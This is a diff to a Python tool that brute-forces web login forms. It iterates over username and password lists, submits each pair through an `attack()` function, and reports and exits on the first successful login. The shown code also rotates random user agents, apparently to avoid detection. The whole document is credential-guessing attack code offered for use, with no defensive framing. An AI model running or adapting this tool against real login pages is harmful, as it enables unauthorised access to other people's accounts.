@@ -1,3 +1,4 @@
+import sys
 import time
 import requests
 from scipy import rand
@@ -9,26 +10,28 @@ from lxml import html
 from scipy import rand
 import mechanize
 import ssl
+success = False
 
-
-def brute(parameters):
+def brute(parameters, passwords):
     '''
     sends all combinations for usernames and passwords to the attack function on the login page
     '''
+
     content = {'url': parameters['url'],
                'method': parameters['method'],
                'user_param': parameters['user_param'],
                'password_param': parameters['password_param'],
                'action' : parameters['action'],
                }
+
     # if userlist is provided then checks if passwordlist is provided or just 1 password
     if parameters['user_list']:
         for user in parameters['user_list']:
             user = user.strip()
             user = user.split('\t')
             content['username'] = user[0]
-            if parameters['password_list']:
-                for password in parameters['password_list']:
+            if passwords:
+                for password in passwords:
                     password = password.strip()
                     password = password.split('\t')
                     content['password'] = password[0]
@@ -37,9 +40,9 @@ def brute(parameters):
                 content['password'] = parameters['password']
                 attack(content)
     # if 1 username is provided then checks if passwordlist is provided or just 1 password
-    elif parameters['password_list']:
+    elif passwords:
         content['username'] = parameters['username']
-        for password in parameters['password_list']:
+        for password in passwords:
             password = password.strip()
             password = password.split('\t')
             content['password'] = password[0]
@@ -49,6 +52,7 @@ def brute(parameters):
         content['username'] = parameters['username']
         content['password'] = parameters['password']
         attack(content)
+        
 
 
 
@@ -83,7 +87,9 @@ def attack(content):
 
     if check_login(resp, content['password_param']):
         print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
-        exit(0)
+        global success
+        success = True
+        sys.exit(1)
 
 def get_random_user_agent():
     '''generate random user agent to fill in the packet header'''
